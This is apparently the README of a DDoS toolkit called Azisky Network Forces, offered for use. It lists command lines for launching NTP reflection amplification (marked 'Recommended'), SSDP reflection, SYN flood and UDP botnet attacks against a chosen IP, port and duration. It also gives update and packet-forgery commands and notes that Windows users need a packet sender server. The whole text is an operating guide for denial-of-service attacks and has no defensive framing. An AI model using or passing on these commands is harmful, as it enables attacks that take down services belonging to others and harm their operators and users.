# Azisky Network Forces(ANF)
This script is running on Linux system.
anf/server/ is for windows user, but you have to have a web package sender server to run this.
---
- For Linux user： 
- 1: You need to upload this to your system.
- 2: Open terminal, use "./anf" to run anf
- 3: Follow the guides&examples to launch your attach!

For Windows user: 
- 1: you will have to own a package sender server.
Update ntp script: "./TFDDOS ntp update -1"
Update udp script: "./TFDDOS udp update -1"
Update syn script: "./TFDDOS syn update -1"
attack : "sudo -i"
custom forgery ： "./la us 100 ntp udp ssdp -1"

There are following methods to attach:
- NTP reflection amplification(Recommended) ： "./ntp {ip} {port} ntp.txt 10 -1 {time(seconds)}"
- SSDP reflection : "./ssdp {ip} {port} ssdp.txt 10 -1 {time(seconds)}"
- SYN flood : "./syn {ip} {port} {time(seconds)}"
- UDP botnet ： "./udp {ip} {port} 10 888 -1 {time(seconds)}" (botnet supported)
